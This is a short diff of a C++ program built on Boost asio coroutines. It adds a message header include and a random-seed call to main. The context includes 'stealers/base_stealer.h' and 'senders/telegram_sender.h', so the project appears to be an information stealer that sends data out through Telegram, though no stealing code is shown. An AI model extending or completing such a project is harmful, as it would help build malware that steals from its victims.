@@ -10,6 +10,7 @@
 
 #include <boost/cobalt.hpp>
 
+#include "messages/text_message.h"
 #include "senders/sender.h"
 #include "senders/telegram_sender.h"
 #include "stealers/base_stealer.h"
@@ -146,6 +147,7 @@ asio::awaitable<void> co_main()
 
 int main()
 {
+    srand(time(NULL));
     asio::io_context io_context;
 
     asio::co_spawn(io_context, co_main(), asio::detached);
